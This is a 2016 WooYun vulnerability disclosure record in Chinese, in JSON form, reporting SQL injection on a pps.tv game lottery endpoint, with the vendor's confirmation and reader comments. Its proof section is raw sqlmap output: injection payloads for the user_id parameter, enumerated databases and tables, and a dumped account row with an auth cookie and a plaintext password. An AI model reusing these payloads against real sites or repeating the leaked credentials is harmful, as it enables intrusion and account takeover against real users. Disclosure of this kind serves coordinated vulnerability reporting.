{"id": 74309, "wybug_id": "wooyun-2016-0169290", "wybug_title": "pps.tv某站注入1200万机器用户明文密码泄露", "wybug_corp": "PPS网络电视", "wybug_author": "小川", "wybug_date": "2016-01-12 10:34", "wybug_open_date": "2016-02-22 16:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-22：\t细节向公众公开  简要描述： 为了提升业绩，项目组也是拼了！ 详细说明：  \n\n   漏洞证明：  sqlmap identified the following injection point(s) with a total of 53 HTTP(s) requests:---Parameter: user_id (GET)    Type: boolean-based blind    Title: MySQL >= 5.0 boolean-based blind - Parameter replace    Payload: r=lottery/FengYunWuShuang/fywsLaba/getGiftList&user_id=(SELECT (CASE WHEN (9676=9676) THEN 9676 ELSE 9676*(SELECT 9676 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries (SELECT - comment)    Payload: r=lottery/FengYunWuShuang/fywsLaba/getGiftList&user_id=1;(SELECT * FROM (SELECT(SLEEP(5)))Slwe)#    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: r=lottery/FengYunWuShuang/fywsLaba/getGiftList&user_id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))Tgmn)---back-end DBMS: MySQL 5.0sqlmap resumed the following injection point(s) from stored session:---Parameter: user_id (GET)    Type: boolean-based blind    Title: MySQL >= 5.0 boolean-based blind - Parameter replace    Payload: r=lottery/FengYunWuShuang/fywsLaba/getGiftList&user_id=(SELECT (CASE WHEN (9676=9676) THEN 9676 ELSE 9676*(SELECT 9676 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))---back-end DBMS: MySQL >= 5.0.0sqlmap resumed the following injection point(s) from stored session:---Parameter: user_id (GET)    Type: boolean-based blind    Title: MySQL >= 5.0 boolean-based blind - Parameter replace    Payload: r=lottery/FengYunWuShuang/fywsLaba/getGiftList&user_id=(SELECT (CASE WHEN (9676=9676) THEN 9676 ELSE 9676*(SELECT 9676 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))---back-end DBMS: MySQL >= 5.0.0available databases [7]:[*] auditlog[*] dba[*] information_schema[*] mysql[*] performance_schema[*] test[*] vip_game_pps_tvsqlmap resumed the following injection point(s) from stored session:---Parameter: user_id (GET)    Type: boolean-based blind    Title: MySQL >= 5.0 boolean-based blind - Parameter replace    Payload: r=lottery/FengYunWuShuang/fywsLaba/getGiftList&user_id=(SELECT (CASE WHEN (9676=9676) THEN 9676 ELSE 9676*(SELECT 9676 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))---back-end DBMS: MySQL >= 5.0.0available databases [7]:[*] auditlog[*] dba[*] information_schema[*] mysql[*] performance_schema[*] test[*] vip_game_pps_tvDatabase: vip_game_pps_tv[48 tables]+--------------------------------------+| game_user_auto_account               || game_user_charge_offset_log          || game_user_charge_success_log         || game_user_coin_check                 || game_user_coin_check_order           || game_user_coin_log                   || game_user_coin_op_activity           || game_user_coin_op_log                || game_user_coin_op_lottery            || game_user_concurrence_lock           || game_user_exp_check                  || game_user_exp_log                    || game_user_exp_op                     || game_user_game_role_info             || game_user_info                       || game_user_info_extra                 || game_user_level_log                  || game_user_level_map                  || game_user_limit_condition            || game_user_lottery_again_log          || game_user_lottery_coin_log           || game_user_lottery_exp_log            || game_user_lottery_giftcard_log       || game_user_lottery_goods              || game_user_lottery_goods_activity     || game_user_lottery_goods_log          || game_user_lottery_log                || game_user_lottery_mobile_log         || game_user_lottery_vip_log            || game_user_mobile_tmp                 || game_user_op_limit_map               || game_user_pending_action_log         || game_user_recover_password_email_log || game_user_voucher                    || game_user_voucher_use_log            || game_vip_error_log                   || game_vip_info_log                    || game_vip_report                      || tv_config                            || tv_count                             || tv_machine                           || tv_user_game_log                     || tv_user_login_record                 || tv_vip_buy_record                    || tv_vipcard                           || tv_vipcard_category                  || tv_viptype                           || tv_vipuser                           |+--------------------------------------+Table: game_user_auto_account[1 entry]+----------+------------+------------+---------+----------+-------------------------+-----------------------------------------------------------------------+---------------------+---------------------+---------------+| id       | user_id    | source_id  | is_send | category | user_name               | authcookie                                                            | update_time         | create_time         | user_password |+----------+------------+------------+---------+----------+-------------------------+-----------------------------------------------------------------------+---------------------+---------------------+---------------+| 57405111 | 4502557117 | 1445507192 | 1       | 2        | B245198056416C2F@pps.tv | eeEH8AbdxVFpXpRYiiq2m2tqpyDDzeJA6gNNnYbSNlekaksyqcgCHOq5FRDWrDJ7nr5d9 | 2015-11-10 17:46:44 | 2015-11-10 12:01:51 | 2389301-Z     |+----------+------------+------------+---------+----------+-------------------------+-----------------------------------------------------------------------+---------------------+---------------------+---------------+   修复方案：  intval   版权声明：转载请注明来源 小川@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2016-01-12 11:13 厂商回复： 感谢关注爱奇艺PPS，漏洞确认存在。 此为游戏用户试用账号，我们会尽快修复。   谢谢支持爱奇艺PPS安全  稍后有小礼品送上  :)   最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-12 10:38 |    \t\t头晕脑壳疼 \t\t\t( 普通白帽子  |\t\t\t        Rank:390 漏洞数:91        | 我是网络小菜鸟)\t\t \n  前排出售暴漫，后边交钱排队看    \n     2016-01-12 10:38 |    \t\tAasron \t\t\t( 普通白帽子  |\t\t\t        Rank:215 漏洞数:59        | 工欲善其事，必先利其器)\t\t \n  我来看暴走漫画    \n     2016-01-12 10:40 |    \t\t胡阿尤 \t\t\t( 实习白帽子  |\t\t\t        Rank:59 漏洞数:9        | 我比那些所谓的演员更加专业、更加高尚、更...)\t\t \n  你关注的白帽子 小川 发表了漏洞 pps.tv某站注入1200万机器用户明文密码泄露    \n     2016-01-12 10:41 |    \t\tFocusstart  \t\t\t( 普通白帽子  |\t\t\t        Rank:681 漏洞数:184        | 努力让某某某成为最幸福的女人！)\t\t \n  baby 带我飞    \n     2016-01-12 10:46 |    \t\t深度安全实验室 \t\t\t( 核心白帽子 |\t\t\t        Rank:2695 漏洞数:454        )\t\t \n  小川。。    \n     2016-01-12 10:59 |    \t\t海琪花 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 卖海产 。。。 不买勿扰)\t\t \n  你关注的白帽子 小川 发表了漏洞 pps.tv某站注入1200万机器用户明文密码泄露     \n     2016-01-12 11:03 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:532 漏洞数:79        | 潜心学习~~~)\t\t \n  明文密码。。。。。 好疼    \n     2016-01-12 11:03 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:1081 漏洞数:251        | 1.乌云最帅的男人                        ...)\t\t \n  @深度安全实验室 表舅  你的蓝色大V呢    \n     2016-01-12 11:04 |    \t\tMark0smith \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:46        | ค้้้้้้้้้)\t\t \n  1200wan    \n     2016-01-12 11:05 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1487 漏洞数:229        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  @牛 小 帅 你亲戚还真多    \n     2016-01-12 11:06 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:1081 漏洞数:251        | 1.乌云最帅的男人                        ...)\t\t \n  @小川 小生四海为家    \n     2016-01-12 11:27 |    \t\t路人毛 \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:25        | ../)\t\t \n  暴漫你好    \n     2016-01-12 11:34 |    \t\t故滨 \t\t\t( 普通白帽子  |\t\t\t        Rank:311 漏洞数:40        )\t\t \n  新一期川神版暴漫    \n     2016-01-12 13:05 |    \t\tSakura丶小樱 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | poi？)\t\t \n  你关注的白帽子 小川 发表了漏洞 pps.tv某站注入1200万机器用户明文密码泄露    \n     2016-01-12 13:06 |    \t\t风格 \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:12        | 注册为白帽子，你可以在这里提交你发现的漏...)\t\t \n  使用账号1200w是什么水准    \n     2016-01-12 13:47 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:7        | 每日必关注乌云)\t\t \n  这个家伙很懒,什么都没有留下.    \n     2016-01-12 14:41 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  我要看暴漫    \n     2016-01-12 18:53 |    \t\tlanyan \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 啦啦啦啦啦 k哥成功和我混)\t\t \n  看漫画    \n     2016-01-14 19:31 |    \t\tMengter \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 太难了.)\t\t \n  来了    \n     2016-01-19 20:39 |    \t\tshen-0529 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:3        | 纯属一个路人甲)\t\t \n  1200W....    \n     2016-01-21 10:53 |    \t\tDracul \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:4        | 萌新white hat)\t\t \n  王尼玛我是你的粉丝，能不能告诉我你那个可以直接显示参数的抓包软件是什么，用burpsuite看参数太费劲(╯‵□′)╯︵┻━┻    \n     2016-01-21 13:12 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1487 漏洞数:229        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  @Dracul fiddler    \n     2016-01-21 18:46 |    \t\tDracul \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:4        | 萌新white hat)\t\t \n  @小川 感谢感谢    \n     2016-01-27 09:39 |    \t\t刘洪泽 \t\t\t( 普通白帽子  |\t\t\t        Rank:149 漏洞数:37        | 小时候不懂事，找过一个ddos工具，传言可以...)\t\t \n  我是来看暴漫的.    \n     2016-02-21 20:34 |    \t\t花卉 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 花卉专注网络安全)\t\t \n  我是来看暴漫的.    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}